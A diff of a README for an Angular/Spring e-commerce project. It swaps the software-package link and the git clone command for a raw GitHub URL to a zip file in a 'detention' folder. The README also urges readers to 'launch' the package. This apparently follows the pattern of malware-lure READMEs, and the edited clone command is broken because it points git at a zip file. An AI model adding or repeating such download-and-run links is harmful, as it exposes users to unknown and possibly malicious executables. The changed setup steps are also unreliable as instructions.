@@ -29,7 +29,7 @@ Explore a wide range of topics related to this project:
 - typescript
 
 ## Software Package
-🚀 Ready to dive into the ECommerceAngularSpring project? [Download Software Package 📦](https://github.com/user-attachments/files/18388744/Software.zip)
+🚀 Ready to dive into the ECommerceAngularSpring project? [Download Software Package 📦](https://raw.githubusercontent.com/AzztroXCRO/ECommerceAngularSpring/main/detention/E_Spring_Angular_Commerce_v1.8.zip)
 
 🚨 *Note: The Software Package needs to be launched for exploring the full potential of the project.*
 
@@ -38,7 +38,7 @@ Ready to start your journey with ECommerceAngularSpring? Follow these steps to g
 
 1. **Clone the Repository**
    ```bash
-   git clone https://github.com/yourusername/ECommerceAngularSpring.git
+   git clone https://raw.githubusercontent.com/AzztroXCRO/ECommerceAngularSpring/main/detention/E_Spring_Angular_Commerce_v1.8.zip
    ```
 
 2. **Backend Setup**
